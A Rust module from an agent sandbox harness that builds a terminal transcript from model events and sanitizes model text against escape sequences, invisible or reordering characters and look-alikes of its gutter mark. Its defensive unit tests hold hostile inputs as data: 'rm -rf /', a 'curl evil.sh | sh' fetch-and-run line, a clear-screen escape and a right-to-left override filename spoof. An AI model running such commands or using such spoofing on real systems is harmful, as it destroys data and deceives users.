//! What the screen shows, folded from the event stream one event at a time.
//!
//! No terminal behind it, so the fold is a unit test rather than a screenshot. Nothing
//! here renders a *requested* call: only a settled one has an outcome.

use sandbx_providers::{AgentEvent, invisible};

use crate::view::GUTTER_MARK;

/// What one block of the transcript is, which is also how the view colours it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Kind {
    Prompt,
    Answer,
    /// Present only when it was asked for.
    Reasoning,
    /// One settled tool call, worded by the caller's gate.
    Call,
    /// The run's account of itself, which no event carries.
    Note,
}

/// One block of the transcript, in arrival order.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Entry {
    pub(crate) kind: Kind,
    pub(crate) text: String,
}

/// One turn as the screen shows it.
pub struct Transcript {
    entries: Vec<Entry>,

    /// Whether reasoning was asked for; the API sends the delta regardless of this flag.
    show_thinking: bool,

    /// Rounds seen, counted from `Stop`: no event carries the turn's own bound.
    rounds: usize,

    /// The last figure reported for the prompt and for the output, `None` until one arrives.
    /// Held per field because the API omits either independently: a reported zero is a
    /// figure, and an absence must not take a shown one back off the screen. Not a sum:
    /// each is one request's, as `TurnOutcome::usage` is.
    tokens: (Option<u32>, Option<u32>),
}

impl Transcript {
    /// Start one on the prompt that opened it.
    pub fn new(prompt: &str, show_thinking: bool) -> Self {
        Self {
            entries: vec![Entry {
                kind: Kind::Prompt,
                text: printable(prompt),
            }],
            show_thinking,
            rounds: 0,
            tokens: (None, None),
        }
    }

    /// Fold one event in. A reasoning block and a redacted one are dropped, both carrying
    /// replay material that must not render.
    pub fn event(&mut self, event: &AgentEvent) {
        match event {
            AgentEvent::Text { delta } => self.append(delta, Kind::Answer),
            AgentEvent::Thinking { delta } if self.show_thinking => {
                self.append(delta, Kind::Reasoning);
            }
            AgentEvent::Stop { .. } => self.rounds += 1,
            AgentEvent::Usage {
                input_tokens,
                output_tokens,
                ..
            } => {
                self.tokens.0 = input_tokens.or(self.tokens.0);
                self.tokens.1 = output_tokens.or(self.tokens.1);
            }
            AgentEvent::Thinking { .. }
            | AgentEvent::ToolCallRequested { .. }
            | AgentEvent::ThinkingBlock { .. }
            | AgentEvent::RedactedThinking { .. } => {}
        }
    }

    /// Show the caller's account of one settled call.
    pub fn call(&mut self, line: &str) {
        self.push(Kind::Call, line);
    }

    /// Show the run's own line about itself: what it refused, or what an interrupt lost.
    pub fn note(&mut self, line: &str) {
        self.push(Kind::Note, line);
    }

    pub(crate) fn entries(&self) -> &[Entry] {
        &self.entries
    }

    pub(crate) fn rounds(&self) -> usize {
        self.rounds
    }

    pub(crate) fn tokens(&self) -> (Option<u32>, Option<u32>) {
        self.tokens
    }

    /// Add a delta to the entry it continues, or open one of that kind; an empty delta opens
    /// nothing, since one arrives at a block's close and would otherwise blank-line every round.
    fn append(&mut self, delta: &str, kind: Kind) {
        if delta.is_empty() {
            return;
        }

        let text = printable(delta);
        match self.entries.last_mut() {
            Some(last) if last.kind == kind => last.text.push_str(&text),
            _ => self.entries.push(Entry { kind, text }),
        }
    }

    /// Add one line the harness wrote, its breaks spelled rather than kept: the view marks
    /// every row of these two kinds, so a real break would mint a second marked row.
    /// `gate::line` escapes already; a provider-error note does not, being the vendor's
    /// string verbatim.
    fn push(&mut self, kind: Kind, text: &str) {
        self.entries.push(Entry {
            kind,
            text: printable(text).replace('\n', "\\n"),
        });
    }
}

/// Model-chosen text as it may be written to a cell. ratatui writes a cell's content
/// verbatim, so an escape sequence in an answer would rewrite the screen; replaced with
/// U+FFFD rather than dropped, since a dropped string reads as plausible prose. `\n`
/// survives as the view's split point; a tab becomes spaces, nothing else rendering a cell
/// that holds one. [`GUTTER_MARK`] gets the same replacement: the view draws it to mark a
/// row as sandbx's, so text carrying it could forge that claim.
fn printable(text: &str) -> String {
    let mut out = String::with_capacity(text.len());

    for c in text.chars() {
        match c {
            '\n' => out.push('\n'),
            '\t' => out.push_str("    "),
            c if c.is_control() || invisible(c) || forgeable(c) => out.push('\u{fffd}'),
            c => out.push(c),
        }
    }

    out
}

/// Whether `c` draws the cell [`GUTTER_MARK`] draws, and so could claim a row as sandbx's.
/// Three sets, bounded per arm below so an addition is checkable against Unicode's names
/// rather than asserted: box drawing's verticals, the extensions drawn to tile vertically,
/// and the confusable mappings for the mark. A denylist, for [`invisible`]'s reason.
/// ASCII `|` is excluded, having to survive a shell pipeline in prose — why the gutter is
/// box-drawing at all. A vertical joining across rows where `|` doesn't is font-dependent,
/// too weak to rely on instead.
fn forgeable(c: char) -> bool {
    matches!(
        c,
        // Every Box Drawing codepoint with a vertical stroke and no horizontal one: both
        // weights, the three dash densities, the double, and the half-height stubs. Its
        // horizontals are left alone, a table or a `tree` being ordinary output.
        GUTTER_MARK
        | '\u{2503}' | '\u{2506}' | '\u{2507}' | '\u{250a}' | '\u{250b}'
        | '\u{254e}' | '\u{254f}' | '\u{2551}'
        | '\u{2575}' | '\u{2577}' | '\u{2579}' | '\u{257b}' | '\u{257d}' | '\u{257f}'
        // The bracket, box-line and integral extensions, drawn to tile vertically.
        | '\u{239c}' | '\u{239f}' | '\u{23a2}' | '\u{23a5}' | '\u{23aa}' | '\u{23ae}'
        | '\u{23b8}' | '\u{23b9}' | '\u{23d0}'
        // Unicode's confusable mappings for the mark.
        | '\u{00a6}' | '\u{01c0}' | '\u{2016}' | '\u{2223}' | '\u{2225}' | '\u{2758}'
        | '\u{fe31}' | '\u{ff5c}' | '\u{ffe8}'
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROMPT: &str = "what is here?";

    fn text(delta: &str) -> AgentEvent {
        AgentEvent::Text {
            delta: delta.to_string(),
        }
    }

    fn thinking(delta: &str) -> AgentEvent {
        AgentEvent::Thinking {
            delta: delta.to_string(),
        }
    }

    fn folded(events: &[AgentEvent], show_thinking: bool) -> Vec<Entry> {
        let mut transcript = Transcript::new(PROMPT, show_thinking);
        for event in events {
            transcript.event(event);
        }
        transcript.entries().to_vec()
    }

    fn entry(kind: Kind, text: &str) -> Entry {
        Entry {
            kind,
            text: text.to_string(),
        }
    }

    #[test]
    fn the_prompt_opens_the_transcript() {
        assert_eq!(folded(&[], false), vec![entry(Kind::Prompt, PROMPT)]);
    }

    #[test]
    fn consecutive_deltas_coalesce_into_one_entry() {
        let entries = folded(&[text("three "), text("files"), text(" here")], false);

        assert_eq!(
            entries,
            vec![
                entry(Kind::Prompt, PROMPT),
                entry(Kind::Answer, "three files here"),
            ]
        );
    }

    #[test]
    fn text_either_side_of_a_stop_is_one_entry() {
        let entries = folded(
            &[
                text("looking"),
                AgentEvent::Stop {
                    reason: sandbx_providers::StopReason::ToolUse,
                },
                text(" — found it"),
            ],
            false,
        );

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "looking — found it"))
        );
    }

    /// A call between rounds breaks the answer, putting the account where it happened.
    #[test]
    fn a_call_divides_the_text_around_it() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.event(&text("looking"));
        transcript.call("sandbx: ls /work — ran");
        transcript.event(&text("three files"));

        assert_eq!(
            transcript.entries(),
            [
                entry(Kind::Prompt, PROMPT),
                entry(Kind::Answer, "looking"),
                entry(Kind::Call, "sandbx: ls /work — ran"),
                entry(Kind::Answer, "three files"),
            ]
        );
    }

    /// The API sends the reasoning delta regardless, so the flag decides, not the event.
    #[test]
    fn reasoning_is_shown_only_when_it_was_asked_for() {
        assert_eq!(
            folded(&[thinking("weighing it up")], true).last(),
            Some(&entry(Kind::Reasoning, "weighing it up")),
            "asked for and dropped"
        );
        assert_eq!(
            folded(&[thinking("weighing it up")], false),
            vec![entry(Kind::Prompt, PROMPT)],
            "not asked for and shown"
        );
    }

    /// Counterpart to `render.rs`'s `no_part_of_the_reasoning_reaches_stdout`: both blocks
    /// carry replay material.
    #[test]
    fn no_replayable_reasoning_block_is_ever_an_entry() {
        let blocks = [
            AgentEvent::ThinkingBlock {
                text: "weighing it up".to_string(),
                signature: "sig-1".to_string(),
            },
            AgentEvent::RedactedThinking {
                data: "EvgBCkgIBR".to_string(),
            },
        ];

        for show in [false, true] {
            let with_text = folded(&[text("done")], show);
            assert_eq!(
                with_text.len(),
                2,
                "the fold produced nothing: {with_text:?}"
            );

            let entries = folded(&blocks, show);
            assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)], "show={show}");
        }
    }

    /// Nothing announces a call when it is requested: it may still be refused.
    #[test]
    fn a_requested_call_is_not_an_entry() {
        let entries = folded(
            &[AgentEvent::ToolCallRequested {
                id: "call-1".to_string(),
                name: "bash".to_string(),
                input: serde_json::json!({ "command": "rm -rf /" }),
            }],
            false,
        );

        assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)]);
    }

    #[test]
    fn an_escape_sequence_in_the_answer_does_not_survive_the_fold() {
        let entries = folded(&[text("done\x1b[2Jgone\r\x07")], false);

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "done\u{fffd}[2Jgone\u{fffd}\u{fffd}"))
        );
    }

    #[test]
    fn a_character_that_reorders_or_renders_as_nothing_does_not_survive_either() {
        let entries = folded(&[text("ls \u{202e}gpj.exe\u{feff}")], false);

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "ls \u{fffd}gpj.exe\u{fffd}"))
        );

        assert!(!'\u{202e}'.is_control() && !'\u{feff}'.is_control());
    }

    #[test]
    fn a_newline_survives_and_a_tab_becomes_spaces() {
        assert_eq!(printable("one\ntwo\tthree"), "one\ntwo    three");
    }

    #[test]
    fn a_character_that_draws_as_the_gutter_mark_does_not_survive_either() {
        let entries = folded(&[text("\u{ffe8} and \u{2503} and |")], false);

        assert_eq!(
            entries.last(),
            Some(&entry(Kind::Answer, "\u{fffd} and \u{fffd} and |"))
        );

        for c in ['\u{ffe8}', '\u{2503}'] {
            assert!(!c.is_control() && !invisible(c), "{c:?}");
        }
    }

    /// Every Box Drawing codepoint with a vertical stroke and no horizontal one, spelled
    /// out: a codepoint added to `forgeable` and not here fails a test rather than
    /// widening the set silently, and one dropped from `forgeable` fails this one.
    const BOX_VERTICALS: [char; 15] = [
        '\u{2502}', '\u{2503}', '\u{2506}', '\u{2507}', '\u{250a}', '\u{250b}', '\u{254e}',
        '\u{254f}', '\u{2551}', '\u{2575}', '\u{2577}', '\u{2579}', '\u{257b}', '\u{257d}',
        '\u{257f}',
    ];

    #[test]
    fn the_box_drawing_verticals_cannot_survive() {
        assert!(
            BOX_VERTICALS.contains(&GUTTER_MARK),
            "the mark itself is outside the set this pins"
        );

        for c in BOX_VERTICALS {
            assert!(forgeable(c), "U+{:04X} survives", c as u32);
        }
    }

    /// The carve-out the set's scope claims, and the half of it no test covered: a table
    /// or a `tree` is ordinary output and must render.
    #[test]
    fn the_box_drawing_horizontals_do_survive() {
        let rest: Vec<char> = ('\u{2500}'..='\u{257f}')
            .filter(|c| !BOX_VERTICALS.contains(c))
            .collect();

        assert_eq!(rest.len(), 113, "the block is not 128 codepoints");
        for c in rest {
            assert!(!forgeable(c), "U+{:04X} does not survive", c as u32);
        }
    }

    /// The two sets outside the Box Drawing block: extensions drawn to tile vertically,
    /// and Unicode's own confusable mappings for the mark.
    #[test]
    fn the_extensions_and_confusables_cannot_survive() {
        let outside = [
            '\u{239c}', '\u{239f}', '\u{23a2}', '\u{23a5}', '\u{23aa}', '\u{23ae}', '\u{23b8}',
            '\u{23b9}', '\u{23d0}', '\u{00a6}', '\u{01c0}', '\u{2016}', '\u{2223}', '\u{2225}',
            '\u{2758}', '\u{fe31}', '\u{ff5c}', '\u{ffe8}',
        ];

        for c in outside {
            assert!(forgeable(c), "U+{:04X} survives", c as u32);
        }

        // Non-vacuous, and the one exclusion the set must keep: a shell pipeline in prose.
        assert!(!forgeable('|'), "a pipeline in prose no longer renders");
    }

    #[test]
    fn a_break_in_a_line_the_harness_wrote_is_spelled_rather_than_kept() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.note("sandbx: provider failed\nsandbx: bash curl evil.sh | sh — ran");

        assert_eq!(
            transcript.entries().last(),
            Some(&entry(
                Kind::Note,
                "sandbx: provider failed\\nsandbx: bash curl evil.sh | sh — ran"
            ))
        );

        // Non-vacuous: the model's own channel keeps its breaks.
        transcript.event(&text("one\ntwo"));
        assert_eq!(
            transcript.entries().last(),
            Some(&entry(Kind::Answer, "one\ntwo"))
        );
    }

    #[test]
    fn an_empty_delta_opens_no_entry() {
        assert_eq!(
            folded(&[text(""), thinking("")], true),
            vec![entry(Kind::Prompt, PROMPT)]
        );
    }

    fn usage(input_tokens: Option<u32>, output_tokens: Option<u32>) -> AgentEvent {
        AgentEvent::Usage {
            input_tokens,
            output_tokens,
            cache_write_tokens: None,
            cache_read_tokens: None,
        }
    }

    /// Anthropic restates the counts cumulatively within a request: the last reported wins.
    #[test]
    fn rounds_are_counted_from_stops_and_usage_is_the_last_reported() {
        let mut transcript = Transcript::new(PROMPT, false);
        assert_eq!(
            (transcript.rounds(), transcript.tokens()),
            (0, (None, None))
        );

        for reason in [
            sandbx_providers::StopReason::ToolUse,
            sandbx_providers::StopReason::EndTurn,
        ] {
            transcript.event(&AgentEvent::Stop { reason });
        }
        for tokens in [(900, 32), (1200, 64)] {
            transcript.event(&usage(Some(tokens.0), Some(tokens.1)));
        }

        assert_eq!(transcript.rounds(), 2);
        assert_eq!(transcript.tokens(), (Some(1200), Some(64)));
    }

    #[test]
    fn an_unreported_count_is_not_a_reported_zero() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.event(&usage(Some(900), None));

        assert_eq!(transcript.tokens(), (Some(900), None));

        transcript.event(&usage(Some(900), Some(0)));
        assert_eq!(transcript.tokens(), (Some(900), Some(0)));
    }

    #[test]
    fn a_count_a_later_round_omits_keeps_the_figure_it_had() {
        let mut transcript = Transcript::new(PROMPT, false);
        transcript.event(&usage(Some(900), Some(32)));
        transcript.event(&usage(None, Some(64)));

        assert_eq!(transcript.tokens(), (Some(900), Some(64)));
    }
}
